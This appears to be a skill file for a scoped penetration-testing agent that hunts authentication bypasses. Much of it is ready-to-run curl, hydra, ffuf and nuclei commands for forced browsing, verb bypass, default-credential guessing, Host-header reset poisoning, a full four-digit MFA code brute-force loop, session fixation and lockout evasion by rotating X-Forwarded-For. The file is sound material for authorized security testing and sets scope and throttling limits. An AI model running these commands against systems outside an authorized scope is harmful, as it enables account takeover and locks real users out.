---
name: hunt-auth-bypass
description: >
  Hunt for authentication bypass: default/weak credentials, forced browsing to protected
  resources, and token/session manipulation. Use when mapping login flows, session
  management, password reset, MFA, and any access-control boundary between unauthenticated
  and authenticated states.
  Keywords: auth bypass, default credentials, forced browsing, broken authentication,
  session fixation, token manipulation, password reset poisoning, MFA bypass, JWT none alg
  (cross-ref hunt-jwt), credential stuffing, account lockout bypass.
  Do NOT use for object-level authorization once already authenticated — use hunt-idor.
  Do NOT use for deep JWT-specific attacks (alg confusion, kid injection) — use hunt-jwt for
  those; this skill covers the broader auth-flow bypass surface.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-287, CWE-307, CWE-640]
  mitre_attack: [T1110, T1078, T1556]
  tools: [curl, burp, hydra, ffuf]
depends_on: [active-recon, web-crawling, auth-mapping]
feeds_into: [chain-analysis, account-takeover]
chains_with: [idor, jwt, csrf, race-condition]
---

## Signals

- Admin/staff panels on predictable paths (`/admin`, `/wp-admin`, `/manager`, `/console`)
  reachable without redirecting to login.
- Default credential candidates: vendor/product defaults (`admin:admin`, `admin:password`,
  device/CMS-specific known defaults) — check against a known-defaults list for the
  fingerprinted product first.
- Password reset flows: token in URL (not POST-only), weak/short/predictable token, or token
  not invalidated after use/expiry.
- Multi-step login/MFA flows where intermediate steps don't verify the previous step actually
  succeeded (step 2 reachable by direct request without completing step 1).
- Client-side-only route guards (SPA redirects to `/login` via JS, but the API endpoint behind
  it answers without a valid session).
- "Remember me" tokens, API keys, or session identifiers with low entropy or predictable
  structure.

## Prerequisites

- A mapped authentication flow (login, logout, password reset, MFA, session issuance) from
  crawling/recon.
- Explicit scope clearance for credential-guessing activity (project rule: default-creds/
  brute-force needs the engagement scope to clearly cover it — these can trigger lockouts
  affecting real users on multi-tenant systems).
- Test accounts at relevant privilege levels already provisioned (reuse from hunt-idor setup
  where applicable).

## Methodology

1. **Forced browsing — direct access to protected paths without a session:**
   ```bash
   curl -s -o /dev/null -w "%{http_code}\n" https://target/admin
   curl -s -o /dev/null -w "%{http_code}\n" https://target/api/admin/users
   # compare authenticated vs unauthenticated response for the same path
   curl -s https://target/api/admin/users -o auth_resp.json
   curl -s -H "Cookie:" https://target/api/admin/users -o noauth_resp.json
   diff auth_resp.json noauth_resp.json
   ```
   Also test trailing variations that sometimes dodge route-guard middleware:
   ```bash
   for path in "/admin" "/admin/" "/Admin" "/admin%20" "/admin." "/admin/.." "//admin" "/admin#"; do
     curl -s -o /dev/null -w "$path -> %{http_code}\n" "https://target$path"
   done
   ```

2. **HTTP method/verb bypass** on a path that 403s for GET:
   ```bash
   for m in GET POST PUT HEAD OPTIONS PATCH TRACE; do
     curl -s -X $m -o /dev/null -w "$m -> %{http_code}\n" https://target/admin/users
   done
   ```

3. **Default credentials** — only against the specific product fingerprinted in recon, not a
   blind spray across every known default list:
   ```bash
   curl -s -X POST https://target/login -d "username=admin&password=admin"
   curl -s -X POST https://target/login -d "username=admin&password=changeme"
   # for fingerprinted products, use their documented defaults specifically, not a generic list
   ```
   If broader credential testing is in scope, throttle hard and prefer a curated, product-
   specific list over a generic 10k-password dictionary:
   ```bash
   hydra -L users.txt -P product_specific_defaults.txt target https-post-form \
     "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 2 -W 2
   ```

4. **Password reset flow abuse:**
   ```bash
   # host-header poisoning of the reset link (if the app builds the link from the Host header)
   curl -s -X POST https://target/password/reset -H "Host: evil.test" -d "email=victim@test.local"
   # check the generated email/link (via a test mailbox you control) for evil.test in the link

   # token predictability — request two resets in quick succession, compare token structure
   curl -s -X POST https://target/password/reset -d "email=testacct1@test.local"
   curl -s -X POST https://target/password/reset -d "email=testacct2@test.local"
   # inspect both tokens (from test mailboxes) for sequential/time-based patterns

   # token reuse after use / expiry — reuse a consumed token
   curl -s "https://target/password/reset/confirm?token=ALREADY_USED_TOKEN" \
     -d "new_password=NewPass123!"
   ```

5. **Multi-step/MFA flow step-skipping** — once step 1 (password) issues a temp session/token
   for step 2 (MFA), test whether step 3 (fully authenticated) is reachable by hitting its
   endpoint directly with only the step-1 artifact:
   ```bash
   curl -s -X POST https://target/login -d "username=test&password=TestPass1!" -c step1_cookies.txt
   # before completing MFA, try an authenticated-only endpoint directly:
   curl -s -b step1_cookies.txt https://target/api/account/profile
   ```
   Also test whether the MFA code itself can be brute-forced (short numeric OTP, no rate limit):
   ```bash
   for code in $(seq 0 9999); do
     curl -s -b step1_cookies.txt -X POST https://target/mfa/verify \
       -d "code=$(printf '%04d' $code)" -o /dev/null -w "$code: %{http_code}\n"
   done | grep -v ": 401\|: 400"
   ```

6. **Session fixation** — check whether the session identifier is accepted/kept across the
   unauthenticated-to-authenticated transition (attacker sets a known session ID, victim logs
   in, attacker reuses the same ID):
   ```bash
   curl -s https://target/login -c pre_login_cookies.txt   # capture pre-auth session ID
   curl -s -b pre_login_cookies.txt -X POST https://target/login \
     -d "username=victim&password=VictimPass1!" -c post_login_cookies.txt
   diff pre_login_cookies.txt post_login_cookies.txt   # session ID unchanged = fixation
   ```

7. **Account lockout bypass via header/IP rotation:**
   ```bash
   for i in $(seq 1 10); do
     curl -s -X POST https://target/login -d "username=victim&password=wrong$i" \
       -H "X-Forwarded-For: 10.0.0.$i"
   done
   # if lockout doesn't trigger with rotating XFF, the control is bypassable
   ```

8. **Automated sweep for exposed admin paths and known default-credential endpoints:**
   ```bash
   ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "https://target/FUZZ" \
     -mc 200,301,302,401,403 -o admin_paths.json -of json
   nuclei -l urls.txt -tags default-login,exposure -o nuclei_auth.txt
   ```

## Tooling

- `curl` — the core manual technique across nearly every variant here.
- `hydra` — throttled, scoped credential testing (never unthrottled full-dictionary sprays
  without explicit operator sign-off).
- `ffuf`/`nuclei -tags default-login` — breadth sweep for exposed admin paths and known default
  creds on fingerprinted products.
- Burp Suite — session token analysis (Sequencer) for entropy/predictability testing.

## Root Causes

- Access-control decisions made only in client-side routing/UI, not re-verified server-side per
  request.
- Multi-step auth flows that don't track flow state server-side (no "MFA pending" session flag
  blocking access to post-auth endpoints until MFA actually completes).
- Session IDs issued before authentication and not regenerated on privilege change (login,
  password change) — classic session fixation root cause.
- Password reset tokens generated from predictable sources (sequential, timestamp-only, weak
  PRNG) or not invalidated after single use/expiry window.
- Products shipped with default credentials that operators never rotate.

## Validation Gate (minimum proof)

- A specific unauthenticated (or lower-privilege) request reaching a resource/action that should
  require full authentication (or higher privilege), with the actual protected response/action
  confirmed (not a generic error page that happens to return 200).
- For credential/brute-force findings: one successful login with the discovered/guessed
  credential pair, demonstrated once — not a mapped list of every weak account.
- For session fixation: demonstrated that a session ID set before login remains valid and
  privilege-elevated after a *different* identity logs in using it.
- For reset-token issues: the actual reset succeeding with the predicted/reused/host-poisoned
  token against a test account you control.

## Gotchas

- **Minimum proof, not a lockout-triggering spray.** Confirm default creds or weak passwords
  against test accounts first; do not brute-force real/unknown user accounts without an
  explicit scope note covering it, since lockouts and alerting affect real users.
- **Common N/A:** client-side route guard present but every underlying API call still correctly
  401s/403s server-side — the client-side gap alone isn't exploitable; confirm the *data* path
  is actually reachable, not just the UI route.
- **Common N/A:** session ID *does* regenerate on login (check both cookie value and any
  server-side session-store rotation) — don't report fixation from cookie persistence alone if
  the underlying server-side session object was actually swapped.
- **Overclaim trap:** a password-reset link containing a token in the URL is not automatically a
  finding — the real question is whether the token is single-use, time-bound, and
  unpredictable; a long random single-use token in a URL (common, acceptable pattern) is not a
  vulnerability by itself.
- **Overclaim trap:** MFA code brute-forcing proof requires showing the *lack* of rate-limiting/
  lockout over a meaningful number of attempts — a handful of tries succeeding by chance is not
  proof; show the systematic sweep and the actual successful bypass.
- Host-header password-reset poisoning requires confirming the email was actually sent with the
  poisoned domain (check a real test mailbox) — a response that merely reflects the Host header
  in a debug page is not the same as confirming the email content.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Admin function access** — Does the bypass grant access to admin-only functions, not just a generic authenticated view?
2. **Other users' data** — Can you access other users' data through the bypassed auth check?
3. **Reliability** — Is the bypass deterministic, or is it actually a race condition that only sometimes succeeds?
4. **Blast radius** — Does the bypass affect one endpoint, or does it invalidate auth checks across the entire API (e.g. a shared middleware flaw)?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Forced-browsing admin bypass → **idor** (once in, authorization gaps on specific objects).
- Session fixation / token reuse → **account-takeover**, flag immediately for operator
  awareness given severity.
- Reset-token/MFA weaknesses chain directly into full account takeover — document as such.
- Default credentials found on an internal admin panel reached via **hunt-ssrf** → escalate
  severity (external attacker reaching an "internal-only" panel through the web app).
